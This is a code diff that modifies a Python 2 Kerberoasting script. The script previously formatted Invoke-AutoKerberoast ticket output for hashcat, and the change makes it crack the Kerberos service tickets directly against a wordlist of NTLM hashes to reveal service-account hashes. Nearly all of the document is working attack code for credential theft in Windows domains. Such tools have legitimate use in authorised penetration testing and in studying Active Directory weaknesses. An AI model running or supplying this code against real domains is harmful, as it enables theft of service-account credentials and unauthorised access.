@@ -1,4 +1,4 @@
-# Note: This is a copy of kirbi2john.py with slight modifications to take input from Invoke-Autokerberoast function output and output in a hashcat-compatible format.
+# Note: This heavily based off tgsrepcrack.py with modifications to take input from the Invoke-Autokerberoast function output and use a wordlist of NTLM hashes instead of passwords
 
 
 # Based on the Kerberoast script from Tim Medin to extract the Kerberos tickets
@@ -21,10 +21,10 @@
 
 from pyasn1.codec.ber import encoder, decoder
 from multiprocessing import JoinableQueue, Manager
-import glob, sys, base64 
+import kerberos, glob, sys, base64, binascii
 
 
-# This will seperate out the list of all tickets into an array of individual tickets
+# This will separate out the list of all tickets into an array of individual tickets
 def parseTickets(allTickets):
 	magicString1 = "Base64 encoded Kerberos ticket for "
 	magicString2 = ":::do"
@@ -53,14 +53,15 @@ def parseTickets(allTickets):
 
 	return ticketArray, labelArray, failedTicketLabelArray
 
-# Format base64 encoded ticket into hashcat-ready string.  Label should be describe where the ticket came from, e.g. "MSSQLSvc/SQLBOX.RESTRICTED.TESTLAB.LOCAL:1433"
-def formatTicket(ticket, label):
+
+# Attempt to crack base64 encoded ticket using NTLM hashes.  Label should be describe where the ticket came from, e.g. "MSSQLSvc/SQLBOX.RESTRICTED.TESTLAB.LOCAL:1433"
+def crackTicket(ticket, label, hashList):
 	try:
 		data = base64.b64decode(ticket)
 	except:
 		#print "DEBUG\n" + str(ticket) + "DEBUG\n\n"
 		return "FAIL" + str(label) + "\n"
-
+	
 	manager = Manager()
 	enctickets = manager.list()
 
@@ -78,23 +79,31 @@ def formatTicket(ticket, label):
 				#print "DEBUG\n" + str(ticket) + "DEBUG\n\n"
 				return "FAIL" + str(label)
 
-	hashcatTicket = "$krb5tgs$23$*" + str(label) + "*$"+enctickets[0][:16].encode("hex")+"$"+enctickets[0][16:].encode("hex")+"\n"
+	print "\nAccount: " + label
 
-	return hashcatTicket
+	for currentHash in hashList:
+		ntlmHash_hex = binascii.unhexlify(currentHash)
+		kdata, nonce = kerberos.decrypt(ntlmHash_hex, 2, enctickets[0])
+		if kdata:
+			print "NTLM Hash: " + currentHash
+			break
+
+	return ""
 
 
 def main():
-	if len(sys.argv) < 2 or len(sys.argv) > 3:
-		print 'USAGE: python ./autoKirbi2hashcat.py <ticketsFile.txt>\n\tNote: Tickets file should be the output of Invoke-AutoKerberoast, starting with \'Base64 encoded Kerberos ticket for...\''
-		print 'OPTIONAL USAGE: python ./autoKirbi2hashcat.py <ticketsFile.txt> MASK\n\tNote: placing the word MASK as the third argument will replace the username/SPN caption with numeric values'
+	if len(sys.argv) < 3 or len(sys.argv) > 4:
+		print 'USAGE: python ./autoNTLMcrack.py <ticketsFile.txt> <NTLM_wordlist.txt>\n\tNote: Tickets file should be the output of Invoke-AutoKerberoast, starting with \'Base64 encoded Kerberos ticket for...\''
+		print 'OPTIONAL USAGE: python ./autoNTLMcrack.py <ticketsFile.txt> <NTLM_wordlist.txt> MASK\n\tNote: placing the word MASK as the forth argument will replace the username/SPN caption with numeric values'
 		exit(1)
 
 	hashcatTickets = ""
 	failedDecodeTicketLabelArray = []
 	ticketsFileName = sys.argv[1]
+	HashFileName = sys.argv[2]
 	maskNames = False
-	
-	if (len(sys.argv) == 3) and (str(sys.argv[2]).upper() == "MASK"):
+
+	if (len(sys.argv) == 4) and (str(sys.argv[3]).upper() == "MASK"):
 		maskNames = True
 
 	ticketsFile = open(ticketsFileName, 'r')
@@ -102,6 +111,9 @@ def main():
 	ticketsFileString = ticketsFileString.replace('[+] received output:','')
 	ticketsFileString = ticketsFileString.replace('received output:','')
 	ticketsFileString = ticketsFileString.replace('\n','')
+
+	HashFile = open(HashFileName, 'r')
+	hashList = HashFile.read().split('\n')
 
 	ticketArray, labelArray, failedRequestTicketLabelArray = parseTickets(ticketsFileString)
 
@@ -116,7 +128,7 @@ def main():
 			failedRequestTicketLabelArray[i] = maskedLabel[:maskedLabelCutOffLoc]
 
 	for i in range(len(ticketArray)):
-		parsedTicket = formatTicket(ticketArray[i], labelArray[i])
+		parsedTicket = crackTicket(ticketArray[i], labelArray[i], hashList)
 		if parsedTicket[0:4] == "FAIL":
 			failedDecodeTicketLabelArray.append(str(parsedTicket)[4:])
 		else:
@@ -125,12 +137,13 @@ def main():
 	print hashcatTickets
 
 	if len(failedRequestTicketLabelArray) > 0:
-		print "WARNING: unable to REQUEST tickets for:"
+		print "\nWARNING: unable to REQUEST tickets for:"
 		print str(failedRequestTicketLabelArray)
 
 	if len(failedDecodeTicketLabelArray) > 0:
 		print "\nWARNING: unable to DECODE tickets for:"
 		print str(failedDecodeTicketLabelArray)
+
 
 if __name__ == '__main__':
     main()
